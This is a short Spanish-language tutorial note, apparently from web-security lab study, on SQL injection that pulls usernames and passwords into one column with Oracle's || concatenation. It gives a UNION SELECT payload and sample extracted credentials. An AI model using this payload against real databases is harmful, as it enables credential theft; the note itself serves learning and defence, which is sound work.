# Recuperar múltiples valores dentro de una sola columna

Se puede recuperar valores juntos dentro de una unica columna concatendando los valores. Se puede incluir separadores para destingir los valores.
En oracle : 
' UNION SELECT username || '~' || password FROM users--
Esto utiliza la secuencia de doble tubo || que es un operador de concatenación de cadenas en Oracle. La consulta inyectada concatena los valores de la username y password campos, separados por el ~ caracter.
Ejemplo : ...
administrator~s3cure
wiener~peter
carlos~montoya
...

Diferentes bases de datos tienen diferente sintaxis para concatenar la cadena.
